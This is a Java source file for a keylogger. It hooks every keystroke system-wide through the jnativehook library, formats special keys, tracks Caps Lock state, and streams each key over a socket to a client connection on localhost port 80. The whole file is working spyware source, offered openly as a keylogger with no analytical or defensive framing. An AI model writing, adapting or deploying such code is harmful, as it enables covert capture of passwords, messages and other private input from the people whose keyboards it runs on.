package Logger;

import com.github.kwhat.jnativehook.GlobalScreen;
import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;

import java.io.IOException;
import java.net.Socket;

public class KeyLogger implements NativeKeyListener {
    Client client;
    boolean upper = false;

    public static void main(String[] args) {
        try {
            GlobalScreen.registerNativeHook();
        } catch (Exception e) {
            e.printStackTrace();
        }

        GlobalScreen.addNativeKeyListener(new KeyLogger());
    }

    public KeyLogger() {
        try {
            client = new Client(new Socket("localhost", 80));
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    @Override
    public void nativeKeyPressed(NativeKeyEvent e) {
        String key = NativeKeyEvent.getKeyText(e.getKeyCode());

        int code = e.getRawCode();
        if(!Character.isLetterOrDigit((char)code)) {
            key = "[" + key + "]";
            if(code == 32)
                key = " ";
            else if(code == 20) //Caps Lock
                upper = !upper;
            else if(code == 9) //tab
                key += "\t";
        }
        else
            key = upper?key:key.toLowerCase();

        client.sendMessage(key);
    }
}